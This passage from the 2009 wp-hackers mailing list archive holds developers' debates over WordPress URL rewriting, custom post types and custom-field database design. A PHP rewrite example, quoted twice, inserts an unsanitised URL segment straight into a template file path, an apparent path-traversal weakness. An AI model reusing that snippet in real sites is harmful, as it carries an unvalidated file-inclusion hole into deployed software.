And see my comments about how that becomes overly complex when you have needs for complex joins (like I've had in several projects the past couple years, one I did in Drupal.)

>> Unless you are talking about things like Map/Reduce or simply carrying redundant data across several tables to improve performance, I'm afraid I'm going to challenge you for concrete examples here that are backed up with something other than opinion.
> 
> Well, simply think about it a minute. Joining tables to obtain data is
> slower than not joining them, obviously. So for something like the
> posts table, you really only want data in it (as columns) that you
> will always need, every time. Author, for example, is something you
> usually will display on the page, so you really always needs it and it
> makes sense to retrieve it, every time.

I agree completely there.

Where I have an issue is when you are talking custom fields.  If you have ten custom fields for a post then it is much slower to load them from a metadata table than from a joined table where the joined table has actual fields for all custom fields.  

With the metadata table approach you either join and get back ten copies of the post body (which is *really* slow), and you have to loop thru in PHP code ten times, or you make two queries and have to loop through PHP code tens times (and two queries are slower than one.)

> But, you don't always need custom_data=bob, do you? So instead of
> mixing that into the main posts table, it's better to have it as a
> meta value in a separate table. Indexed on the post id and the key
> name, for quick lookups. Then, you can get that meta data only when
> the program actually asks for it, on demand, sort of thing. Saves you
> a lot of time since you're not getting it every time. If you were to
> merge it into the main table, then you'd spend a lot of time getting
> "custom_data = null" back from the database, when you didn't care
> about the custom_data column in the slightest.

I agree you do not merge into the main table. That's why you put it into a wp_custom_products table instead of in wp_posts.

In this, I think there should be moderation in all things.  IOW, ideally WordPress would have the option to use metadata for most use cases but also be able to use separate tables when the user and their use cases demand it.

-Mike

From otto at ottodestruct.com  Thu Dec  3 18:48:59 2009
From: otto at ottodestruct.com (Otto)
Date: Thu, 3 Dec 2009 12:48:59 -0600
Subject: [wp-hackers] The problem with WP_Rewrite <<< RE: Options for
	Controller - Views
In-Reply-To: <63AC3F44-0004-4C77-85F6-8ED674E39301@newclarity.net>
References: <4B0C80C1.5070502@santosj.name>
	<E7B7D271-B75D-4561-BE5F-8E054D62F7A7@newclarity.net> 
	<161617690911281113q2e5f0460m12364d97e8a1cbfa@mail.gmail.com> 
	<37AD065D-6910-4110-A9DA-21B63ED65CCA@newclarity.net>
	<161617690912030804k11df1471h18f98d298b5a8e7@mail.gmail.com> 
	<566F50E8-9066-4A0B-B486-2BC2574CA946@newclarity.net>
	<161617690912030901h7ca37287t6a46c11f135388f4@mail.gmail.com> 
	<A5DC889F-117C-483F-91E8-840B0B98E165@newclarity.net>
	<161617690912030943r270d5237xb35de5f73fcde502@mail.gmail.com> 
	<63AC3F44-0004-4C77-85F6-8ED674E39301@newclarity.net>
Message-ID: <161617690912031048v60c7c081x6afddd52485159c7@mail.gmail.com>

On Thu, Dec 3, 2009 at 12:34 PM, Mike Schinkel
<mikeschinkel at newclarity.net> wrote:
> And to be blunt in return, it's exactly that type of position that I think should disqualify your opinion from having any sway with respect to WordPress' direction. ?That is highly condescending. ?Your assertion would compare to me saying "Unless you have the skills of the German masters you shouldn't be allowed to brew beer."

Okay, two things:
1. Brewing beer is way harder than regular expressions.
2. Both brewing beer and regular expressions are things that you can
actually learn how to do.

You're acting as if regexp is some other level of godly existence that
is impossible for some mere mortal to achieve. FFS man, we're talking
about figuring out * and ? and . and such here. Parenths for $matches.
That's all there really is to it for these purposes. It's just not all
that freakin' complicated.

Yes, I assume human beings have brains. For you to assume that people
who write themes are barely capable of tying their shoelaces is what
is really condescending here.

And with that, we're done. I'm not going to bother to respond to you
on the list anymore, so I suggest you just drop it.

-Otto
Sent from Memphis, TN, United States

From wp-hackers at striderweb.com  Thu Dec  3 18:54:23 2009
From: wp-hackers at striderweb.com (Stephen Rider)
Date: Thu, 3 Dec 2009 12:54:23 -0600
Subject: [wp-hackers] The problem with WP_Rewrite <<< RE: Options for
	Controller - Views
In-Reply-To: <63AC3F44-0004-4C77-85F6-8ED674E39301@newclarity.net>
References: <4B0C80C1.5070502@santosj.name>
	<8B9D5A49-3CE6-4661-9B3B-EBCF617B3E99@newclarity.net>
	<161617690911271131t6d21b3f6y35bc814f73f09a06@mail.gmail.com>
	<E7B7D271-B75D-4561-BE5F-8E054D62F7A7@newclarity.net>
	<161617690911281113q2e5f0460m12364d97e8a1cbfa@mail.gmail.com>
	<37AD065D-6910-4110-A9DA-21B63ED65CCA@newclarity.net>
	<161617690912030804k11df1471h18f98d298b5a8e7@mail.gmail.com>
	<566F50E8-9066-4A0B-B486-2BC2574CA946@newclarity.net>
	<161617690912030901h7ca37287t6a46c11f135388f4@mail.gmail.com>
	<A5DC889F-117C-483F-91E8-840B0B98E165@newclarity.net>
	<161617690912030943r270d5237xb35de5f73fcde502@mail.gmail.com>
	<63AC3F44-0004-4C77-85F6-8ED674E39301@newclarity.net>
Message-ID: <1184CA90-A544-4F74-AFB1-44752B672F49@striderweb.com>


On Dec 3, 2009, at 12:34 PM, Mike Schinkel wrote:

> Honestly, if you can't see why it's easier or even accept that other people can see things different then there's nothing left for us to discuss.  

Mike -- I think you've officially reached the point where it's time to make a patch.  Said patch will either fly or it won't, but more yelling at each other isn't doing anything.

Stephen

From wp at xentek.net  Thu Dec  3 18:56:24 2009
From: wp at xentek.net (Eric Marden)
Date: Thu, 3 Dec 2009 13:56:24 -0500
Subject: [wp-hackers] One CMS to Rule Them All (was This was painful to
	read...)
In-Reply-To: <483AB521-875E-4E64-BDC0-5439D4B29A76@striderweb.com>
References: <161617690912021019x352c941fqb4a7393c0d8cef28@mail.gmail.com>
	<7b4922320912021112g1125b466qee1af65ba3a31dd7@mail.gmail.com>
	<C2F2ABDB-517D-4508-953A-CF61D70419A8@newclarity.net>
	<161617690912021422k2abfe799v1c99190dca3f5666@mail.gmail.com>
	<a1fff2b20912021442p202110c5h414c871ad90f9708@mail.gmail.com>
	<4BF9C9D5-C886-44F4-9CF5-70F64808F037@newclarity.net>
	<7b4922320912021542w724948f5t7a0cd89a4bf57848@mail.gmail.com>
	<483AB521-875E-4E64-BDC0-5439D4B29A76@striderweb.com>
Message-ID: <97F882A8-2A70-4D36-B85B-784883CB79DB@xentek.net>

On Dec 2, 2009, at 8:41 PM, Stephen Rider wrote:

> 1) I heartily agree with and support the prospect of creating API  
> functions the make it easy (simple!) for plugins to add custom post  
> types.


It already is dead simple. What is needed is an api for creating  
interfaces for making custom post forms. The underlying storage and  
retrieval API is solid.


- Eric Marden
__________________________________
http://xentek.net/code/wordpress/
tw: @xentek





From jwriteclub at gmail.com  Thu Dec  3 19:18:04 2009
From: jwriteclub at gmail.com (Christopher O'Connell)
Date: Thu, 3 Dec 2009 12:18:04 -0700
Subject: [wp-hackers] The problem with WP_Rewrite <<< RE: Options for
	Controller - Views
In-Reply-To: <161617690912030943r270d5237xb35de5f73fcde502@mail.gmail.com>
References: <4B0C80C1.5070502@santosj.name>
	<161617690911271131t6d21b3f6y35bc814f73f09a06@mail.gmail.com> 
	<E7B7D271-B75D-4561-BE5F-8E054D62F7A7@newclarity.net>
	<161617690911281113q2e5f0460m12364d97e8a1cbfa@mail.gmail.com> 
	<37AD065D-6910-4110-A9DA-21B63ED65CCA@newclarity.net>
	<161617690912030804k11df1471h18f98d298b5a8e7@mail.gmail.com> 
	<566F50E8-9066-4A0B-B486-2BC2574CA946@newclarity.net>
	<161617690912030901h7ca37287t6a46c11f135388f4@mail.gmail.com> 
	<A5DC889F-117C-483F-91E8-840B0B98E165@newclarity.net>
	<161617690912030943r270d5237xb35de5f73fcde502@mail.gmail.com>
Message-ID: <81d01c0912031118v3fca59eeh27447870f8de8bab@mail.gmail.com>

Otto,

Your argument just doesn't make sense. By your logic, we shoudn't abstract
away SQL, because "if a person is not capable of understanding SQL, and
can't look in a book for 10 minutes to figure out what they want to do, then
they should not be writing code of any kind. They should stick to something
simple, like flipping burgers."

The reason we abstract stuff away is to simplify programming. It's a common
use case to redirect a URL to a controller (and that's what it is, no matter
what you want to call it). It should therefore be simple. I don't know how
they do things in the South, but out west a couple of dozen lines of code
including RegEx is NOT SIMPLE! Indeed, it's so not simple, that it's broken.

Mike: I'll be happy to help out in a week or so.

~ Christopher

P.S. Brewing beer, is, IMHO much simpler than RegEx

P.P.S. This reminds me of the discussions on some of the linux boards about
how "including a graphical package manager is totally unneccessary, because
there's a command line one".

... To be quite blunt, if a person is not capable of understanding
> regular expressions, and can't look in a book for 10 minutes to figure
> out what they want to do, then they should not be writing code of any
> kind. They should stick to something simple, like flipping burgers.
>
> Obviously, I don't expect an end user to understand regular
> expressions. I wouldn't want people making fields to put regexp on the
> admin screens, for example.
>
> But there's a certain level of knowledge you need to obtain to write
> code, and to write PHP code in particular. Simple Regular Expressions
> is one of those most basic levels of things you need to know, just
> after string handling.
>
> Do I expect a plugin author to understand regexp? Absolutely.
> Do I expect a theme author to understand regexp? No.
> Do I expect them to be able to ask somebody or Google search to find
> examples? Yes.
>
> >> The post_type variable is supported in 2.8, but *custom* post_type
> >> support wasn't added until 2.9.
> >
> > But it still doesn't work in 2.8, right?   At least it didn't work when I
> tried to use the URL with a post_type parameter on an existing live site.
>  Anyway, not important.
>
> No, it works in 2.8 just fine, but the post_type must be "post", or
> "page", or "attachment", etc. Basically, wp_query didn't like anything
> but the various built in ones.
>
> > Conversely I'm floored by your adamancy about not wanting to make this
> common need approachable.  The code you mention is fine for plugins but not
> fine for themes.
>
> The code I mentioned was *far* more appropriate for themes than for
> plugins, because it's creating specific conditions that the theme must
> satisfy (like having a custom/products.php file in it, for example).
> And it didn't even require regexp.
>
> > The skill level for PHP coding among plugin developers is much higher
> than for your *average* themer who in many cases use cuts and pastes PHP
> code from examples...
>
> What's wrong with them cut and pasting the example from somewhere and
> modifying it to their needs?
>
> More to the point, what makes you think a theme author isn't going to
> do the same with your add_custom_url nonsense, eh? You've got a ton of
> "magic" words in there... url-type, callback, single-post, etc, etc.
> And it's using an array as well.
>
> I am really not seeing why you think your method is any easier or less
> complicated, especially if you're going to assume that the theme
> author doesn't know PHP all that well. Heck man, theme authors cut and
> paste the register_sidebar calls for their functions.php files all the
> time, and they're about as complex as your add_custom_url is.
>
> -Otto
> Sent from Memphis, TN, United States
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From mikeschinkel at newclarity.net  Thu Dec  3 19:21:45 2009
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Thu, 3 Dec 2009 14:21:45 -0500
Subject: [wp-hackers] One CMS to Rule Them All (was This was painful to
	read...)
In-Reply-To: <161617690912031026y663467a4m579fc6e56036a818@mail.gmail.com>
References: <161617690912021019x352c941fqb4a7393c0d8cef28@mail.gmail.com>
	<7b4922320912021112g1125b466qee1af65ba3a31dd7@mail.gmail.com>
	<C2F2ABDB-517D-4508-953A-CF61D70419A8@newclarity.net>
	<161617690912021422k2abfe799v1c99190dca3f5666@mail.gmail.com>
	<C467409A-DE43-49A7-BE43-EF6FC0DE5A34@newclarity.net>
	<161617690912030654x794bbbf2xe2c2ea644ad0c7c0@mail.gmail.com>
	<8E9CD77F-65C2-4B8F-BF84-15725466DDCA@newclarity.net>
	<161617690912030920h6036c8dbw60c1f84af8ec7726@mail.gmail.com>
	<828D7201-5A95-41F5-B954-E10F6884D5DC@newclarity.net>
	<161617690912031026y663467a4m579fc6e56036a818@mail.gmail.com>
Message-ID: <B3BC1158-BCF5-4AAB-85A7-F663574148C3@newclarity.net>

On Dec 3, 2009, at 1:26 PM, Otto wrote:
> WordPress is primarily a blogging platform. Yes, you can build any
> sort of thing out of WordPress, if you like, but perhaps you shouldn't
> always do that.

And that's your opinion which you are entitled to. My opinion differs.  

WordPress.org calls itself "a state-of-the-art publishing platform" (and not "a state-of-the-art blogging platform.")  Obviously someone involved in WordPress thinks that WordPress is now more than just a blogging platform.  Of course there are still the factions that want to block any changes that could make it a better CMS.  It's my hope that those factions don't succeed.

BTW, it reminds me of the Army Corp of Engineers in North Georgia. It's run by a group of fishermen.  Their opinion of Lake Lanier is it is "a fishing lake" though it is far more popular for recreational use. Thus, even though the vast majority of users are recreational the Corp blocks every attempt to make the lake safer for recreation because the changes affect it's use as a fishing lake.  What they *could* do is make the 20% of the lake that is popular for recreation safer for recreation and leave the remaining 80% good for fishing, but they won't even consider that approach. 

>> And it's the most common use case for when WordPress doesn't *already* handle the URL in an acceptable way. (Can you propose a more common use case where WordPress doesn't already handle the URL in an acceptable way?)
> 
> The most common use case I've seen is where people want to customize
> the URL to pull specific posts or sets of pages or what have you. Most
> of these are pretty easy, and don't necessarily involve custom post
> types.

My opinion is that they are not using custom post types yet because they are not yet available in the release version.  Wait a while and I believe that will change.  But it is my opinion so we can only wait to see if I am right or not.

> The most common case I've seen for plugins to use it is to create
> their own subset of pages to display whatever. Like an image gallery,
> for example. It takes over the /gallery/* set of pages, redirects to
> itself, and does whatever it likes.

Or, custom post types by another name...

>>> Yes, a variable template. As in maybe I have a products directory, and
>>> whatever.php is inside it. I can also have an index.php inside it as a
>>> fallback position, perhaps. This is how much of the theme hierarchy
>>> works, after all.
>> 
>> Then you misunderstand how URL templates work.  You specify them from specific to general.
>>  You handle the use-case you refer to by adding another custom url definition, not by making
>> each custom url overly complicated to specify.
> 
> Total nonsense. Utter gibberish.

Why must you be so condescending?  It's hard not to take things personal when you describe my writings in those terms.

> You're making things way too complex
> and slow by doing that. What if I have 20000 products, after all?

Again, you misunderstand (willfully?)

You would never do 20000 custom urls, you'd only do one custom url for all products.  But let's say you wanted to have a custom URL that lists recent products, and you want the "recent" slug to be used like the "acme-widgets" slug; you would add two custom URL templates:

/products/recent/				<-- this is more specific and would match first
/products/{product_slug}/

> Better to match /products/* once and then redirect based on the
> contents of the * piece than to define 20000 separate rules of
> /products/1, /products/2 and so forth..


See, you did misunderstand.  And I think your misunderstanding was total nonsense and utter gibberish! ;-)

> 
> Example: I want /products/whatever to redirect to
> products/whatever.php in my theme directory. If whatever.php doesn't
> exist, then use the products/index.php instead.

You are conflating the two. What's more what you propose is bad REST, HTTP and URL design.  You should issue a 404 error, not redirect to the general purpose.

> Code to do it for ALL arbitrary whatever's:
> function plugin_add_custom_urls() {
> add_rewrite_rule('products/(.*)[/]?$', 'index.php?product=$matches[1]', 'top');
> add_rewrite_tag('%product%','.*');
> }
> add_action('init', 'plugin_add_custom_urls');
> 
> function plugin_add_template() {
> $product = get_query_var('product');
> if (!empty($product)) {
>   locate_template(array("products/$product.php","products/index.php"), true);
>   exit;
> }
> }
> add_action('template_redirect', 'plugin_add_template');
> 
> Just that easy.

The word "easy" and that code are oxymorons.

>>> add_rewrite_endpoint('foo-page', EP_ROOT);
>> 
>> Easily for you.  Not easily for most themers.
> 
> One line of code, which I just gave to you and the rest of the
> internet, is somehow hard to modify?

One line of code, to go along with the tens of other lines of code.  One is not an issue. "Many" is.

>> Insane?  It's nice to see you can be condescending without saying anything of substance.  I'll try to refrain from doing this same.
> 
> Hey, I calls 'em like I sees 'em. I think it is slightly insane to go
> to extreme lengths to wrap things and make them more complicated and
> less capable in the process.

And I am starting to think I'm insane for debating you. 
> 
>> It already exists, and is too complex for the average person to use in a theme.
> 
> This is only your opinion. Please stop treating it like some kind of
> Truth handed down from up on high, when it is no such thing. Thanks.

Ironic, you are treating your own opinions as truth handed down from up on high; why shouldn't I?

Better yet, maybe we are getting somewhere. How about we agree on this list that both of our opinions are just that, and not the final word on anything.  Deal?

>>> - Layers make things slower. This is just a fact. More code = more
>>> memory used = slower.
>> 
>> Not necessarily.  It depends on how the layer is implemented.
> 
> False. Layers *ALWAYS* make things slower. This is easy to prove.
> Method 1: I execute code A.
> Method 2: I call layer B which in turn executes code A.
> 
> Method 2 is always slower than method 1. Furthermore. Method 2
> implements code designed to abstract portions of the underlying code,
> which takes time to run. Making it even slower.


It's foolish for you to say false here.  If the layer doesn't execute it doesn't make things slower.

Adding a hook makes things slower.  Does that stop the core team from adding new hooks each version?  Premature optimization is a fools errand.

>> So we are enforcing an orthodoxy, are we?
> 
> No, we're just not encouraging one. That was sort of my point.

Fair enough.  I am encouraging another one.  That's my point.

>> It *IS TOO BLOODY COMPLICATED*!!!
> 
> Your opinion again.

Ditto on all your prior assertions that came without proof.
> 
>> How many WordPress websites are using URL rewriting right now?!?
> 
> Well, I'd say almost all of them use it in one form or another,
> actually. Of course, they do it through plugins, generally speaking,
> but hey. Anybody running an image gallery plugin, off the top of my
> head, is using URL rewriting to some degree.

That's answering out of context.  I'm asking how many people are doing URL rewriting where they had to write the code you are promoting?  Very few.

> Why don't you search the plugin svn repo for how many instances you
> can find of "add_rewrite" and see what you come up with?

What I'd prefer to do is search the theme repo for it.  Again, plugins are not my use case, themes are.

>> As respectfully as I can be, I think you are in a bubble.
> 
> I would say the same back to you, but I think we're past that point.
> 
> Nice having this chat with you, but we're done now.

Finally.  I proposed that a while ago.

>> Well, we must disagree on this.  I'll submit a patch when I can; feel free to do your best to block it if you must.
> 
> Stop taking things personally. I'm not against *you*, I'm against
> *your idea*. I'm all for improving WordPress. I just don't think that
> this idea is an improvement.

I'm not taking things personally. I'm focused on the approach.  And I plan to ignore your concerns because I think they are irrational and move forward with a patch as soon as I can.

-Mike

From jwriteclub at gmail.com  Thu Dec  3 19:25:26 2009
From: jwriteclub at gmail.com (Christopher O'Connell)
Date: Thu, 3 Dec 2009 12:25:26 -0700
Subject: [wp-hackers] One CMS to Rule Them All (was This was painful to
	read...)
In-Reply-To: <161617690912031026y663467a4m579fc6e56036a818@mail.gmail.com>
References: <161617690912021019x352c941fqb4a7393c0d8cef28@mail.gmail.com> 
	<7b4922320912021112g1125b466qee1af65ba3a31dd7@mail.gmail.com> 
	<C2F2ABDB-517D-4508-953A-CF61D70419A8@newclarity.net>
	<161617690912021422k2abfe799v1c99190dca3f5666@mail.gmail.com> 
	<C467409A-DE43-49A7-BE43-EF6FC0DE5A34@newclarity.net>
	<161617690912030654x794bbbf2xe2c2ea644ad0c7c0@mail.gmail.com> 
	<8E9CD77F-65C2-4B8F-BF84-15725466DDCA@newclarity.net>
	<161617690912030920h6036c8dbw60c1f84af8ec7726@mail.gmail.com> 
	<828D7201-5A95-41F5-B954-E10F6884D5DC@newclarity.net>
	<161617690912031026y663467a4m579fc6e56036a818@mail.gmail.com>
Message-ID: <81d01c0912031125i2e5f5f0cyf856a526ef5dac10@mail.gmail.com>

Code to do it for ALL arbitrary whatever's:
> function plugin_add_custom_urls() {
>  add_rewrite_rule('products/(.*)[/]?$', 'index.php?product=$matches[1]',
> 'top');
>  add_rewrite_tag('%product%','.*');
> }
> add_action('init', 'plugin_add_custom_urls');
>
> function plugin_add_template() {
>  $product = get_query_var('product');
>  if (!empty($product)) {
>   locate_template(array("products/$product.php","products/index.php"),
> true);
>   exit;
>  }
> }
> add_action('template_redirect', 'plugin_add_template');
>
> Just that easy.
>

Still going with not easy enough, especially since there are clearly
superior ways of doing this.


> > Insane?  It's nice to see you can be condescending without saying
> anything of substance.  I'll try to refrain from doing this same.
>
> Hey, I calls 'em like I sees 'em. I think it is slightly insane to go
> to extreme lengths to wrap things and make them more complicated and
> less capable in the process.
>
> > It already exists, and is too complex for the average person to use in a
> theme.
>
> This is only your opinion. Please stop treating it like some kind of
> Truth handed down from up on high, when it is no such thing. Thanks.
>

Umm, yeah, your opinion of insanity == clear truth, while a reasoned comment
about complexity == just your opinion? QED.


>
> >> - Layers make things slower. This is just a fact. More code = more
> >> memory used = slower.
> >
> > Not necessarily.  It depends on how the layer is implemented.
>
> False. Layers *ALWAYS* make things slower. This is easy to prove.
> Method 1: I execute code A.
> Method 2: I call layer B which in turn executes code A.
>
> Method 2 is always slower than method 1. Furthermore. Method 2
> implements code designed to abstract portions of the underlying code,
> which takes time to run. Making it even slower.
>
> ALL layers are slower than bypassing them, by definition. That's just
> one argument though, it's not a critical indictment against layers as
> a concept.
>
>
Dear Otto: This is a silly argument: we're writing in a language that gets
translated through many steps into machine code. One extra function call to
simplify the code isn't going to have any appreciable effect. Furthermore,
there's already lots of abstraction that could be taken out if this was
really that important.


> > So we are enforcing an orthodoxy, are we?
>
> No, we're just not encouraging one. That was sort of my point.
>

A bad one!

~ Christopher

From mikeschinkel at newclarity.net  Thu Dec  3 19:26:51 2009
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Thu, 3 Dec 2009 14:26:51 -0500
Subject: [wp-hackers] The problem with WP_Rewrite <<< RE: Options for
	Controller - Views
In-Reply-To: <161617690912031048v60c7c081x6afddd52485159c7@mail.gmail.com>
References: <4B0C80C1.5070502@santosj.name>
	<E7B7D271-B75D-4561-BE5F-8E054D62F7A7@newclarity.net>
	<161617690911281113q2e5f0460m12364d97e8a1cbfa@mail.gmail.com>
	<37AD065D-6910-4110-A9DA-21B63ED65CCA@newclarity.net>
	<161617690912030804k11df1471h18f98d298b5a8e7@mail.gmail.com>
	<566F50E8-9066-4A0B-B486-2BC2574CA946@newclarity.net>
	<161617690912030901h7ca37287t6a46c11f135388f4@mail.gmail.com>
	<A5DC889F-117C-483F-91E8-840B0B98E165@newclarity.net>
	<161617690912030943r270d5237xb35de5f73fcde502@mail.gmail.com>
	<63AC3F44-0004-4C77-85F6-8ED674E39301@newclarity.net>
	<161617690912031048v60c7c081x6afddd52485159c7@mail.gmail.com>
Message-ID: <9E36D20B-370D-4F87-80EE-F940E5489BEE@newclarity.net>

On Dec 3, 2009, at 1:48 PM, Otto wrote:
> On Thu, Dec 3, 2009 at 12:34 PM, Mike Schinkel
> <mikeschinkel at newclarity.net> wrote:
>> And to be blunt in return, it's exactly that type of position that I think should disqualify your opinion from having any sway with respect to WordPress' direction.  That is highly condescending.  Your assertion would compare to me saying "Unless you have the skills of the German masters you shouldn't be allowed to brew beer."
> 
> Okay, two things:
> 1. Brewing beer is way harder than regular expressions.

Heh.  BTW, I thought you were done?

> You're acting as if regexp is some other level of godly existence that
> is impossible for some mere mortal to achieve. FFS man, we're talking
> about figuring out * and ? and . and such here. Parenths for $matches.
> That's all there really is to it for these purposes. It's just not all
> that freakin' complicated.

How about you come to Atlanta WordPress and will ask the following questions:

1.) How many of you know regular expressions?
2.) How many of you are willing to learn regular expressions?

If you get more than 30% uptake, I'll concede.

> Yes, I assume human beings have brains. For you to assume that people
> who write themes are barely capable of tying their shoelaces is what
> is really condescending here.

Mine are not assumptions.  I've done a lot of WordPress training locally. I've had this discussion with people over and over who have told me they either can't figure out regular expressions or they don't want to deal with regular expressions.  It's not because I haven't tried. Can you say the same?

> And with that, we're done. I'm not going to bother to respond to you
> on the list anymore, so I suggest you just drop it.

My response is for others following this as much as you.  But I'm glad you are dropping it, I'm ready to too.

-Mike

From mikeschinkel at newclarity.net  Thu Dec  3 19:27:24 2009
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Thu, 3 Dec 2009 14:27:24 -0500
Subject: [wp-hackers] The problem with WP_Rewrite <<< RE: Options for
	Controller - Views
In-Reply-To: <1184CA90-A544-4F74-AFB1-44752B672F49@striderweb.com>
References: <4B0C80C1.5070502@santosj.name>
	<8B9D5A49-3CE6-4661-9B3B-EBCF617B3E99@newclarity.net>
	<161617690911271131t6d21b3f6y35bc814f73f09a06@mail.gmail.com>
	<E7B7D271-B75D-4561-BE5F-8E054D62F7A7@newclarity.net>
	<161617690911281113q2e5f0460m12364d97e8a1cbfa@mail.gmail.com>
	<37AD065D-6910-4110-A9DA-21B63ED65CCA@newclarity.net>
	<161617690912030804k11df1471h18f98d298b5a8e7@mail.gmail.com>
	<566F50E8-9066-4A0B-B486-2BC2574CA946@newclarity.net>
	<161617690912030901h7ca37287t6a46c11f135388f4@mail.gmail.com>
	<A5DC889F-117C-483F-91E8-840B0B98E165@newclarity.net>
	<161617690912030943r270d5237xb35de5f73fcde502@mail.gmail.com>
	<63AC3F44-0004-4C77-85F6-8ED674E39301@newclarity.net>
	<1184CA90-A544-4F74-AFB1-44752B672F49@striderweb.com>
Message-ID: <8AF814EC-D094-4F75-9ADC-EE368821DD9F@newclarity.net>

On Dec 3, 2009, at 1:54 PM, Stephen Rider wrote:
> On Dec 3, 2009, at 12:34 PM, Mike Schinkel wrote:
>> Honestly, if you can't see why it's easier or even accept that other people can see things different then there's nothing left for us to discuss.  
> Mike -- I think you've officially reached the point where it's time to make a patch.  Said patch will either fly or it won't, but more yelling at each other isn't doing anything.

I'm there.

-Mike

From listswphackers at mist.org.uk  Thu Dec  3 19:36:16 2009
From: listswphackers at mist.org.uk (mrmist)
Date: Thu, 3 Dec 2009 19:36:16 +0000
Subject: [wp-hackers] Database structure Wordpress
In-Reply-To: <161617690912030712v5edc0858uc8b6d9bfaef26260@mail.gmail.com>
References: <C98C6445-D7ED-44CE-AA53-EB3FAFD0022B@gmail.com>
	<161617690912030712v5edc0858uc8b6d9bfaef26260@mail.gmail.com>
Message-ID: <+iaFqNBwMBGLFwzA@dsl-217-155-35-239.zen.co.uk>

In message 
<161617690912030712v5edc0858uc8b6d9bfaef26260 at mail.gmail.com>, Otto 
<otto at ottodestruct.com> writes
>
>It's all well and good to have good database design, but the
>difference is that good design does not equate to "faster" in real
>world applications. The goal of "high performance" is often in direct
>conflict with correct relational database design. Took me a long time
>before I figured that one out.
>


One table per type in the way that's been described is not good 
relational design in any case, it's breaking normalisation rules.  If 
you were to introduce a table for "car" and a table for "van" and they 
ultimately contain the same information columns, that's poor design, and 
will lead to you having to do work in the code base which could 
otherwise have been done more efficiently through set based SQL.

For example, in that case, you'd also need another table that holds the 
names of all the sub-tables, and to fetch everything you'd first have to 
collect all the sub-table names with one query, then loop through N more 
queries for each sub-table, or pass through horrific unions in your 
database calls. It's just messy.

The "multiple tables for the same thing" sort of design thinking tends 
to be favoured by programmer types more than database types.

Fair enough, you can abstract if you like, but it should be conforming 
to rules, and doing that does tend to lead to reasonably complex 
database designs which might not be the fastest.
-- 
mrmist

From mikeschinkel at newclarity.net  Thu Dec  3 19:53:53 2009
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Thu, 3 Dec 2009 14:53:53 -0500
Subject: [wp-hackers] Database structure Wordpress
In-Reply-To: <+iaFqNBwMBGLFwzA@dsl-217-155-35-239.zen.co.uk>
References: <C98C6445-D7ED-44CE-AA53-EB3FAFD0022B@gmail.com>
	<161617690912030712v5edc0858uc8b6d9bfaef26260@mail.gmail.com>
	<+iaFqNBwMBGLFwzA@dsl-217-155-35-239.zen.co.uk>
Message-ID: <2337E749-27DE-448F-B7A4-EB48CDD60FC9@newclarity.net>

On Dec 3, 2009, at 2:36 PM, mrmist wrote:
> In message <161617690912030712v5edc0858uc8b6d9bfaef26260 at mail.gmail.com>, Otto <otto at ottodestruct.com> writes
>> 
>> It's all well and good to have good database design, but the
>> difference is that good design does not equate to "faster" in real
>> world applications. The goal of "high performance" is often in direct
>> conflict with correct relational database design. Took me a long time
>> before I figured that one out.
> 
> One table per type in the way that's been described is not good relational design in any case, it's breaking normalisation rules.  If you were to introduce a table for "car" and a table for "van" and they ultimately contain the same information columns, that's poor design, and will lead to you having to do work in the code base which could otherwise have been done more efficiently through set based SQL.

For clarity I don't think what you are suggesting is what was proposed (or maybe it was, but it's not what I'm proposing):

Instead of two tables "car" and "van" you'd have three tables "vehicle", "car" and "van."  Vehicle would have shared content and then car and van would have only the fields that differ.

To use an example more concrete for WordPress, let's say you have two custom post types, "Products" and "Companies."  You could end up with three tables to manage this with one-to-one relationships between posts and products and between posts and companies:

wp_posts
wp_custom_products
wp_custom_companies

To see this structure in action look at Drupal's CCK module or the PODs plugin for WordPress.  And it is relationally correct.

But again, this should probably be an option to the current metadata table approach for only if and when it is needed.

> For example, in that case, you'd also need another table that holds the names of all the sub-tables, and to fetch everything you'd first have to collect all the sub-table names with one query, then loop through N more queries for each sub-table, or pass through horrific unions in your database calls. It's just messy.

Ugh, not sure where you get that, but yes it would be very messy.

> The "multiple tables for the same thing" sort of design thinking tends to be favoured by programmer types more than database types.

FYI, I was a database guy before I was a programmer.  :)

-Mike

From zamoose at gmail.com  Thu Dec  3 20:59:50 2009
From: zamoose at gmail.com (Doug Stewart)
Date: Thu, 3 Dec 2009 15:59:50 -0500
Subject: [wp-hackers] Custom Post - implementation specifics
In-Reply-To: <A4DBBAE2-37FE-4ED3-A1A3-7A54980E1B3E@striderweb.com>
References: <BA11F8C4-C212-46A5-84C2-C37AD621FEB3@striderweb.com>
	<161617690912030956tcb3bbb5l824b1f47cc657726@mail.gmail.com>
	<A4DBBAE2-37FE-4ED3-A1A3-7A54980E1B3E@striderweb.com>
Message-ID: <71ddd7490912031259p703dd9e6he8947c9c4bd78455@mail.gmail.com>

My one HUGE request:

* Hierarchies for custom post types/taxonomies. (Slap me if I'm mixing
my metaphors and have the notion of custom post types all
whopperjawed...)

As of right now, if you register a custom taxonomy and want automatic
buy-in from WP's administrative interface, you HAVE to make it a flat
taxonomy. Hierarchical ones simply fail to register and no amount of
prodding seems to work.

I'd like to have the ability to have a single "ancestor" post with an
arbitrary number of related child and grandchild and great-grandchild
(et cetera) posts each with the potential to be another unique type.

So, for instance, in a simplistic use case, if I were to create a
"magazine" using WordPress, I could create "issues", each of which
could have "articles".  In a bit more complex of a metaphor, I could
have a daily "newspaper" with "issues", each of which had a "section"
that then proceeded to have "articles".

Am I making sense here?

-- 
-Doug
@zamoose
http://literalbarrage.org/blog/

From otto at ottodestruct.com  Thu Dec  3 21:39:53 2009
From: otto at ottodestruct.com (Otto)
Date: Thu, 3 Dec 2009 15:39:53 -0600
Subject: [wp-hackers] The problem with WP_Rewrite <<< RE: Options for
	Controller - Views
In-Reply-To: <81d01c0912031118v3fca59eeh27447870f8de8bab@mail.gmail.com>
References: <4B0C80C1.5070502@santosj.name>
	<E7B7D271-B75D-4561-BE5F-8E054D62F7A7@newclarity.net> 
	<161617690911281113q2e5f0460m12364d97e8a1cbfa@mail.gmail.com> 
	<37AD065D-6910-4110-A9DA-21B63ED65CCA@newclarity.net>
	<161617690912030804k11df1471h18f98d298b5a8e7@mail.gmail.com> 
